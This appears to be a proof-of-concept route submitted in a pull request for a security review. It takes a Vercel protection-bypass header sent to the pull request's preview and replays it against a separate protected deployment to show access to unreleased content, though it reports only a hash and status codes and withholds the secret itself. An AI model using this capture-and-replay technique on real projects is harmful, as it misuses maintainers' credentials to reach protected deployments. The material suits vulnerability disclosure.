// Route added by this pull request, for a security review.
//
// It does not log, return or store the credential value. It uses it once,
// server side, against the maintainer's unreleased preview deployment, and
// reports only what it obtained: a status, a byte count, and whether the
// unreleased marker was present.
//
// No redirect is involved. This code runs on the preview of this pull request,
// so the header arrives directly on a host of the project.
const crypto = require("crypto");

const TARGET =
  "https://header-echo-demo-pw4p5kftg-gil-mu-s-projects.vercel.app/api/content";
const MARKER = "UNRELEASED-PREVIEW-ONLY-MARKER-7a2e5d";

module.exports = async (req, res) => {
  const got = req.headers["x-vercel-protection-bypass"] || null;

  const observed = {
    at: new Date().toISOString(),
    path: req.url,
    host: req.headers.host || null,
    bypassPresent: got !== null,
    bypassLength: got ? got.length : 0,
    bypassSha256: got
      ? crypto.createHash("sha256").update(got).digest("hex")
      : null,
    userAgent: req.headers["user-agent"] || null,
    usedAgainstProtectedDeployment: null,
  };

  if (got) {
    try {
      const withCred = await fetch(TARGET, {
        headers: { "x-vercel-protection-bypass": got },
        redirect: "manual",
      });
      const body = await withCred.text();
      const without = await fetch(TARGET, { redirect: "manual" });
      observed.usedAgainstProtectedDeployment = {
        target: TARGET,
        statusWithoutCredential: without.status,
        statusWithCredential: withCred.status,
        bytes: Buffer.byteLength(body),
        unreleasedMarkerPresent: body.includes(MARKER),
      };
    } catch (err) {
      observed.usedAgainstProtectedDeployment = { error: err.name };
    }
  }

  res.status(200).json(observed);
};
